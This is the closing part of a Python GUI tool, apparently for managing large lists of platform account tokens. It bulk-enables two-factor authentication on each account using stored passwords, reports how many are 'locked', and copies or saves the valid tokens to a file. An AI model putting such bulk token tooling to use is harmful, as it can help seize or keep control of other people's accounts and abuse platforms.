                    result = enable_totp_2fa(t.token, t.password)
                    t.token = result['new_token']
                    t.mfa = True
                    success += 1
                    print(f'[2fa-bulk] {i+1}/{total} ✅ {t.username}')
                except Exception as e:
                    fail += 1
                    print(f'[2fa-bulk] {i+1}/{total} ❌ {t.username}: {e}')
                time.sleep(1.5)  # Rate limit safety
            # Save updated tokens
            with self._lock:
                save_tokens_to_file(self.tokens)
            self._safe_update_ui()
            self.after(0, lambda: self._flash_status(f"2FA done: {success} locked, {fail} failed"))
            print(f'[2fa-bulk] Complete: {success}/{total} locked')
        threading.Thread(target=_worker, daemon=True).start()

    # ━━━ Clipboard / Save ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _copy_token(self, token):
        self.clipboard_clear(); self.clipboard_append(token)
        self._flash_status("Copied")

    def _copy_all_valid(self):
        with self._lock:
            valid = [t.token for t in self.tokens if t.valid is True]
        if not valid: self._flash_status("No valid tokens"); return
        self.clipboard_clear(); self.clipboard_append('\n'.join(valid))
        self._flash_status(f"Copied {len(valid)} tokens")

    def _save_tokens(self):
        with self._lock: save_tokens_to_file(self.tokens)
        count = sum(1 for t in self.tokens if t.valid is True)
        self._flash_status(f"Saved {count} to tokens.txt")

    def _flash_status(self, text, duration=3000):
        try:
            self.status_lbl.configure(text=text, text_color=C['green'])
            self.after(duration, lambda: self.status_lbl.configure(text="", text_color=C['text_muted']))
        except: pass

    def destroy(self):
        self._destroyed = True
        self.auto_check_running = False
        try: self._scan_pool.shutdown(wait=False)
        except: pass
        for key, panel in list(self._panels.items()):
            try: panel.force_destroy()
            except: pass
        super().destroy()


def _badge(parent, text, color):
    """Inline badge pill."""
    f = ctk.CTkFrame(parent, fg_color=color, corner_radius=5, height=20)
    f.pack(side="left", padx=(6, 0)); f.pack_propagate(False)
    ctk.CTkLabel(f, text=f" {text} ", font=_F(FONT, 10, "bold"),
                 text_color="#ffffff", height=20).pack(padx=3)


if __name__ == '__main__':
    app = DataHub()
    app.mainloop()
